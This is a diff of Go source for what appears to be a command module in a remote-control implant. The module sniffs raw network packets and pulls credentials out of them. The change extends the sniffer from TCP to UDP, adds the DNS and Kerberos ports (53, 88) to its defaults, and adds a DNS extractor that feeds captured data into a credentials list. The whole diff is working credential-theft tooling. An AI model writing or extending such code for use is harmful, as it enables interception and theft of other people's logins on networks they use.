@@ -58,7 +58,7 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 	if len(ports) == 0 {
-		ports = []uint16{21, 80, 110, 143, 389, 445, 8080}
+		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
 	}
 
 	// Find the local IP to bind to
@@ -146,7 +146,8 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 
 		ihl := int(ipData[0]&0x0F) * 4
-		if ihl < 20 || ihl > len(ipData) || ipData[9] != 6 { // Protocol 6 = TCP
+		proto := ipData[9]
+		if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
 			continue
 		}
 		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
@@ -158,13 +159,31 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			SrcIP: net.IP(ipData[12:16]).String(),
 			DstIP: net.IP(ipData[16:20]).String(),
 		}
-		tcpData := ipData[ihl:totalLen]
+		transportData := ipData[ihl:totalLen]
 
-		if len(tcpData) < 20 {
+		var payload []byte
+		if proto == 6 { // TCP
+			if len(transportData) < 20 {
+				continue
+			}
+			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+			dataOff := int(transportData[12]>>4) * 4
+			if dataOff < 20 || dataOff > len(transportData) {
+				continue
+			}
+			payload = transportData[dataOff:]
+		} else { // UDP
+			if len(transportData) < 8 {
+				continue
+			}
+			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+			payload = transportData[8:]
+		}
+		if len(payload) == 0 {
 			continue
 		}
-		meta.SrcPort = binary.BigEndian.Uint16(tcpData[0:2])
-		meta.DstPort = binary.BigEndian.Uint16(tcpData[2:4])
 
 		// Port filter
 		portMatch := false
@@ -175,15 +194,6 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			}
 		}
 		if !portMatch {
-			continue
-		}
-
-		dataOff := int(tcpData[12]>>4) * 4
-		if dataOff < 20 || dataOff > len(tcpData) {
-			continue
-		}
-		payload := tcpData[dataOff:]
-		if len(payload) == 0 {
 			continue
 		}
 
@@ -199,6 +209,9 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 			result.Credentials = append(result.Credentials, cred)
 		}
 		if cred := sniffExtractKerberos(payload, &meta); cred != nil {
+			result.Credentials = append(result.Credentials, cred)
+		}
+		if cred := sniffExtractDNS(payload, &meta); cred != nil {
 			result.Credentials = append(result.Credentials, cred)
 		}
 	}
